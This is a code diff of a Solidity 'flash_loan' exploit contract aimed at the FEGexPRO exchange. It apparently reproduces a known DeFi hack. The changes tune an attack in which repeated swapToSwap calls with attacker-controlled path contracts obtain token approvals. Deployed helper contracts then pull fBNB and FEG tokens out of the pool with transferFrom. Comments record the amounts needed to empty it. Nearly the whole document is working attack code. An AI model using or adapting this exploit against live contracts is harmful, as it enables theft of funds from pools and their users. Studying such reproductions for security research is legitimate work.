@@ -17,6 +17,14 @@ interface IDDPA_flashloan{
     function getVaultReserve() external view returns (uint256 baseReserve, uint256 quoteReserve);
 }
 
+interface swap {
+    function depositInternal(address asset, uint256 amt) external;
+    function payMain(address payee, uint256 amount) external;
+    function payToken(address payee, uint256 amount) external;
+    function BUY(uint256 dot, address to, uint256 minAmountOut) external payable;
+}
+
+
 interface IfBNB{
     function deposit() external payable;
     function balanceOf(address account) external view  returns (uint256);
@@ -35,6 +43,8 @@ interface IFEGexPRO{
     function withdrawInternal(address asset, uint256 amt) external;
     function transfer(address dst, uint256 amt) external returns(bool);
     function transferFrom(address src, address dst, uint256 amt) external returns(bool);
+
+    function payMain(address payee, uint256 amount) external;
 }
 
 interface IWBNB{
@@ -134,31 +144,33 @@ contract flash_loan{
 
         IfBNB(fBNB).approve(FEGexPRO, balance0);              //115650737205006083495
 
-        IFEGexPRO(FEGexPRO).depositInternal(fBNB, 115650737205006082495);        // IfBNB(fBNB).balanceOf(address(this)) - 1000
+        IFEGexPRO(FEGexPRO).depositInternal(fBNB, 115650737205006082495);               // IfBNB(fBNB).balanceOf(address(this)) - 1000
+        // console.log("fbnb balanceof FEGexPRO...", IERC20(fBNB).balanceOf(FEGexPRO));
         (uint256 return0, uint256 return1) = IFEGexPRO(FEGexPRO).userBalanceInternal(address(this));
         console.log("4xxxxx FEGexPRO userBalanceInternal return0  , return1 : ", return0, return1);
 
-        // IFEGexPRO(FEGexPRO).swapToSwap(address(this), fBNB, address(this), return1);           //has approve bugs,
-        (bool success, bytes memory return_msg) = FEGexPRO.call(abi.encodeWithSignature("swapToSwap(address path,address asset,address to,uint256 amt)", address(this), fBNB, address(this), return1));          /////////////////////////////
-        console.log("return message is: ", success);
-        console.log("---------------------------------------------------------------");
+        IFEGexPRO(FEGexPRO).swapToSwap(address(this), fBNB, address(this), return1);           //has approve bugs,
+        // (bool success, bytes memory return_msg) = FEGexPRO.call(abi.encodeWithSignature("swapToSwap(address path,address asset,address to,uint256 amt)", address(this), fBNB, address(this), return1));          /////////////////////////////
+        // console.log("return message is: ", success);
         // IFEGexPRO(FEGexPRO).depositInternal(fBNB, 1);
 
         for(uint i = 0; i < 10; i++){
             IFEGexPRO(FEGexPRO).depositInternal(fBNB, 1);
-            FEGexPRO.call(abi.encodeWithSignature("swapToSwap(address path,address asset,address to,uint256 amt)", address(acc[i]), fBNB, address(this), return1));
-            // IFEGexPRO(FEGexPRO).swapToSwap(address(acc[i]), fBNB, address(this), return1);
+            // console.log("++++++++++++++fbnb balanceof FEGexPRO...", IERC20(fBNB).balanceOf(FEGexPRO));
+            // FEGexPRO.call(abi.encodeWithSignature("swapToSwap(address path,address asset,address to,uint256 amt)", address(acc[i]), fBNB, address(this), return1));
+            IFEGexPRO(FEGexPRO).swapToSwap(address(acc[i]), fBNB, address(this), return1);
         }
         console.log("5xxxxx after 10 times deposit and swap fBNB......");
-
 
         IfBNB(fBNB).transferFrom(FEGexPRO, address(this), return1);
         // console.log("I have fBNB balance: ", IfBNB(fBNB).balanceOf(address(this)));
         console.log("FEGexPRO fBNB balance: ", IfBNB(fBNB).balanceOf(FEGexPRO));
 
-        for(uint i = 0; i < 10; i++){
+        for(uint i = 0; i < 9; i++){
             deploy_new_contract(payable(address(acc[i]))).name_2097a739_first(return1);
         }
+        //last contract transfer all the tokens....
+        deploy_new_contract(payable(address(acc[9]))).name_2097a739_first(IfBNB(fBNB).balanceOf(FEGexPRO));
         console.log("6xxxxx after 10 times fBNB transferfrom......");
 
         uint FEGtoken_balance = IERC20(FEGtoken).balanceOf(FEGexPRO);               //277330342870186251832396
@@ -194,20 +206,31 @@ contract flash_loan{
         IFEGexPRO(FEGexPRO).depositInternal(FEGtoken, 30814678938542177811298);              //30814678938542177811298
         (uint256 return0, uint256 return1) = IFEGexPRO(FEGexPRO).userBalanceInternal(address(this));
         console.log("8xxxxxx FEGexPRO userBalanceInternal return0  , return1 : ", return0, return1);        //30202049261636789716172,  10
+
         IFEGexPRO(FEGexPRO).swapToSwap(address(this), FEGtoken, address(this), return0);
 
         for(uint i = 0; i < 10; i++){
-            IFEGexPRO(FEGexPRO).depositInternal(fBNB, 1);
-            IFEGexPRO(FEGexPRO).swapToSwap(address(acc[i]), fBNB, address(this), return1);
+            IFEGexPRO(FEGexPRO).depositInternal(FEGtoken, 1);
+            // console.log("++++++++++++++fbnb balanceof FEGexPRO...", IERC20(FEGtoken).balanceOf(FEGexPRO));
+            IFEGexPRO(FEGexPRO).swapToSwap(address(acc[i]), FEGtoken, address(this), return0);
         }
 
-        IERC20(FEGtoken).transferFrom(FEGexPRO, WBNB_FEGexPRO, return1);                //30202049261636789716172
+        IERC20(FEGtoken).transferFrom(FEGexPRO, WBNB_FEGexPRO, return0);                //30202049261636789716172
         // uint256 FEGexPRO_feg_balance = IERC20(FEGtoken).balanceOf(FEGexPRO);
         // console.log("FEGexPRO_feg_balance balance: ", FEGexPRO_feg_balance);
 
-        for(uint i = 0; i < 10; i++){
-            deploy_new_contract(payable(address(acc[i]))).name_2097a739_second(return1);
+        //circle 11 times, or subtraction overflow!!!!!!!!
+        for(uint i = 0; i < 8; i++){
+            deploy_new_contract(payable(address(acc[i]))).name_2097a739_second(WBNB_FEGexPRO, return0);
         }
+        //////////////////be careful!!!
+        deploy_new_contract(payable(address(acc[8]))).name_2097a739_second(WBNB_FEGexPRO, 2191994356480214994286);        //2191994356480214994286
+        console.log("---------------------------------------------------------------different to address...");
+        deploy_new_contract(payable(address(acc[8]))).name_2097a739_second(WBNB_FEGtoken, 28010054905156574721886);
+        deploy_new_contract(payable(address(acc[9]))).name_2097a739_second(WBNB_FEGtoken, 5520457747011060314875);
+        ///////////////////////////////////////
+
+
         console.log("9xxxxx after 10 times FEGtoken transferfrom......");
 
         uint FEG_balance_remain = IERC20(FEGtoken).balanceOf(address(this));
@@ -256,6 +279,14 @@ contract flash_loan{
 
     fallback() external{}
 
+
+    function depositInternal(address tokens, uint256 amount) external {}
+
+    function userBalanceInternal(address _addr) external view returns(uint256 tokens, uint256 mains){}
+
+    function payMain(address to, uint256 amount) external {}
+
+    function payToken(address payee, uint256 amount) external{}
 }
 
 contract deploy_new_contract{
@@ -273,11 +304,19 @@ contract deploy_new_contract{
         IfBNB(fBNB).transferFrom(FEGexPRO, admin, amount);
     }
 
-    function name_2097a739_second(uint256 amount) public{
+    function name_2097a739_second(address to, uint256 amount) public{
         console.log("FEGexPRO has FEGtoken balance: ", IfBNB(FEGtoken).balanceOf(FEGexPRO));
-        IfBNB(FEGtoken).transferFrom(FEGexPRO, admin, amount);
+        IfBNB(FEGtoken).transferFrom(FEGexPRO, to, amount);
     }
 
     receive() external payable{}
     fallback() external{}
+    function depositInternal(address tokens, uint256 amount) external {}
+
+    function userBalanceInternal(address _addr) external view returns(uint256 tokens, uint256 mains){}
+
+    function payMain(address to, uint256 amount) external {}
+
+    function payToken(address payee, uint256 amount) external{}
 }
+
